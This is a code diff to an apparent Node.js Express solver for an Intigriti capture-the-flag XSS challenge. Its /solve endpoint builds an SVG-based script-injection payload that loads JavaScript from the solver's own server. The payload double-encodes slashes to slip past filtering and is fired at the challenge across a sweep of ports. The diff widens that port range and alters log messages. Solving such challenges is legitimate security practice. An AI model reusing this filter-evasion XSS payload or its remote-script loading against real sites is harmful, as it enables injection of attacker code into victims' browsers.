@@ -44,16 +44,16 @@ app.get('/retrieve', (req, res) => {
 // Endpoint to automatically start solving the challenge
 app.get('/solve', async (req, res) => {
   try {
-    console.log('Solving...');
+    console.log('Solving in about 30 seconds...');
     // Log the received flag
-    const page404Script = `https://${req.headers.host}/${files[1]}`;
+    const page404Script = `http://${req.headers.host}/${files[1]}`; 
     const challengeEndpoint = 'https://challenge-1023.intigriti.io';
 
     // Array to hold promises for fetch requests
     const fetchPromises = [];
 
     // Scan ports with intervals to stay within Puppeteer's browser default timeout (30s)
-    for (let port = 45000; port > 35000; port -= 2500) {
+    for (let port = 45000; port > 30000; port -= 2500) {
       const payload = `<svg><b id="</title><script src='${page404Script}'></script>">?startPort=${port}`;
       const encodedPayload = payload.replace(/[/]/g, '%2526%2523x2f%253b');
       // Push each fetch promise to the array
@@ -66,7 +66,7 @@ app.get('/solve', async (req, res) => {
     await Promise.all(fetchPromises);
 
     // Send a success response
-    res.sendStatus(200);
+    res.send("Check server log for more info.");
   } catch (error) {
     console.error('Error during automatic solving:', error);
     // Send an error response
